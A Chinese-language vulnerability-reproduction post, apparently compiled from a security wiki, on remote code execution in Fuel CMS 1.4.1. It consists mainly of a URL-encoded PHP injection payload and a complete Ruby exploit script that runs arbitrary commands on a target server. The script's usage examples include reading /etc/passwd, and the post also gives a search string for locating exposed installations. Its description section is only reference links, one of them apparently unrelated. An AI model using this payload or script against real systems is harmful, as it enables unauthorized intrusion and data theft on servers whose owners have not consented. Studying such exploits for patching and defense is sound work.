---
title: "Fuel CMS 1.4.1 远程代码执行漏洞"
date: 2026-10-12 09:00:31
categories:
  - WebSecurity
  - CVE
  - "cms"
  - "Fuel-CMS"
tags:
  - "Fuel-CMS"
  - "代码执行"
  - "漏洞复现"
---
## 漏洞描述

参考链接：

* https://github.com/nahi/httpclient/issues/242
* https://www.exploit-db.com/exploits/49487

## 网络测绘

```
"Fuel CMS"
```

## 漏洞复现

poc：

```
/fuel/pages/select/?filter='%2Bpi(print(%24a%3D'system'))%2B%24a('#{cmd}')%2B'
```

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">#!/usr/bin/env ruby

require 'httpclient'
require 'docopt'

# dirty workaround to ignore Max-Age
# https://github.com/nahi/httpclient/issues/242#issuecomment-69013932
$VERBOSE = nil

doc = &lt;&lt;~DOCOPT
  Fuel CMS 1.4 - Remote Code Execution

  Usage:
    #{__FILE__} &lt;url&gt; &lt;cmd&gt;
    #{__FILE__} -h | --help

  Options:
    &lt;url&gt;         Root URL (base path) including HTTP scheme, port and root folder
    &lt;cmd&gt;         The system command to execute
    -h, --help    Show this screen

  Examples:
    #{__FILE__} http://example.org id
    #{__FILE__} https://example.org:8443/fuelcms 'cat /etc/passwd'
DOCOPT

def exploit(client, root_url, cmd)
  url = root_url + "/fuel/pages/select/?filter='%2Bpi(print(%24a%3D'system'))%2B%24a('#{cmd}')%2B'"

  res = client.get(url)

  /&#115;ystem(.+?)&lt;div/mx.match(res.body).captures[0].chomp
end

begin
  args = Docopt.docopt(doc)
  clnt = HTTPClient.new
  puts exploit(clnt, args['&lt;url&gt;'], args['&lt;cmd&gt;'])
rescue Docopt::Exit =&gt; e
  puts e.message
end</code></pre>

</details>

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cms/Fuel-CMS-1.4.1-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
